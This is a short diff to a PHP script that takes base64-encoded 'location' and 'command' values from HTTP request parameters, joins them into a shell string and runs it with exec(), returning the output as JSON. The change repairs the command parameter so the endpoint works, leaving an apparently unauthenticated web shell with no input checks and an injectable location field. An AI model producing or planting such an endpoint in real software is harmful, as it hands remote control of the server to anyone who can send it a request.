@@ -1,8 +1,9 @@
 <?php
 
 $location         = base64_decode($_REQUEST['location']);
-$requestedCommand = base64_decode($_REQUEST['location']);
+$requestedCommand = base64_decode($_REQUEST['command']);
 $runnableCommand  = "cd ".$location." && ".$requestedCommand;
+
 exec(
     $runnableCommand,
     $output,
@@ -10,6 +11,6 @@ exec(
 );
 
 echo json_encode([
-    'output'       => base64_encode($output),
-    'returnStatus' => base64_encode($returnStatus),
+    'output'       => $output,
+    'returnStatus' => $returnStatus,
 ]);
